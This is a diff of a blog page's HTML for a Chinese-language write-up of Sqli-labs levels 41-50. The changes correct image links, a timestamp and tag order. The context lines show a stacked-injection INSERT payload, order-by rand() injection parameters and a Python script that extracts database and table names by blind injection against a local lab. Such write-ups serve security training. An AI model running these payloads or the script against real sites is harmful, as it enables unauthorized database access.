@@ -22,9 +22,9 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-4.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-5.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-2.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/9-1.png">
-<meta property="og:updated_time" content="2019-07-31T09:22:34.539Z">
+<meta property="og:updated_time" content="2019-08-01T05:11:21.174Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqli-labs(第41-50关)">
 <meta name="twitter:description" content="前一部分链接：第31-40关Write-up Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload 1?id=1;insert into users(id,username,password) values(&amp;apos;37&amp;apos;,&amp;apos;users37&amp;apos;,&amp;apos;password37&amp;apos;);--+ Less-42本">
@@ -197,7 +197,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(true)</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png" alt="6-1"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(false)</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png" alt="6-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-2.png" alt="6-2"></p>
 <p>现在就可以写一个python来爆破</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/AAsqli-labs/Less-46/"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#database</span></span><br><span class="line">database_payload = <span class="string">"?sort=rand(ascii(substr(&#123;&#125;,&#123;&#125;,1))=&#123;&#125;)"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">125</span>):</span><br><span class="line">        array = []</span><br><span class="line">        payload = database_payload.format(<span class="string">"database()"</span>,i,j)</span><br><span class="line">        r = requests.get(url=url+payload)        </span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>,<span class="number">3</span>):</span><br><span class="line">            soup = re.findall(<span class="string">"&gt;(.*)&lt;"</span>,str(BeautifulSoup(r.text,<span class="string">"lxml"</span>).select(<span class="string">"td"</span>)[m]))[<span class="number">0</span>]</span><br><span class="line">            array.append(soup)</span><br><span class="line">        <span class="keyword">if</span>(array[<span class="number">0</span>]==<span class="string">"11"</span> <span class="keyword">and</span> array[<span class="number">1</span>]==<span class="string">"5"</span> <span class="keyword">and</span> array[<span class="number">2</span>]==<span class="string">"4"</span>):</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">print(<span class="string">"The name of database: "</span> + database)</span><br><span class="line"></span><br><span class="line"><span class="comment">#table</span></span><br><span class="line">database = <span class="string">"security"</span></span><br><span class="line">table_array = []</span><br><span class="line">table_payload = <span class="string">"?sort=rand(ascii(substr((select table_name from information_schema.tables where table_schema=\"&#123;&#125;\" limit &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;)"</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    table_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">96</span>,<span class="number">125</span>):</span><br><span class="line">            array = []</span><br><span class="line">            payload = table_payload.format(database,s,i,j)</span><br><span class="line">            r = requests.get(url=url+payload)        </span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>,<span class="number">3</span>):</span><br><span class="line">                soup = re.findall(<span class="string">"&gt;(.*)&lt;"</span>,str(BeautifulSoup(r.text,<span class="string">"lxml"</span>).select(<span class="string">"td"</span>)[m]))[<span class="number">0</span>]</span><br><span class="line">                array.append(soup)</span><br><span class="line">            <span class="keyword">if</span>(array[<span class="number">0</span>]==<span class="string">"11"</span> <span class="keyword">and</span> array[<span class="number">1</span>]==<span class="string">"5"</span> <span class="keyword">and</span> array[<span class="number">2</span>]==<span class="string">"4"</span>):</span><br><span class="line">                table_name = table_name + chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    table_array.append(table_name)</span><br><span class="line">set = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table_array:</span><br><span class="line">    print(<span class="string">"The table of "</span> + database + <span class="string">": "</span> + str(set) + <span class="string">"."</span> + str(i) + <span class="string">" "</span>)</span><br><span class="line">    set = set + <span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>等待之后就可以得出结果</p>
@@ -220,7 +220,7 @@
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/9-1.png" alt="9-1"></p>
 <h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>本关开始，考察的是<code>order by注入</code>+<code>堆叠注入</code>，使用<code>mysqli_multi_query()</code>函数，前面关卡已经讲解过，不再赘述</p>
 <p>至此，41-50关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/03/Sqli-labs%20%E7%AC%AC51-65%E5%85%B3/">第51-60关Write-up</a></p>
+<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/03/Sqli-labs%20%E7%AC%AC51-65%E5%85%B3/">第51-60关Write-up</a>Less-51</p>
 
       
 
@@ -437,11 +437,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -449,11 +449,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+                <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
               </li>
              
               <li class="article-tag-list-item">
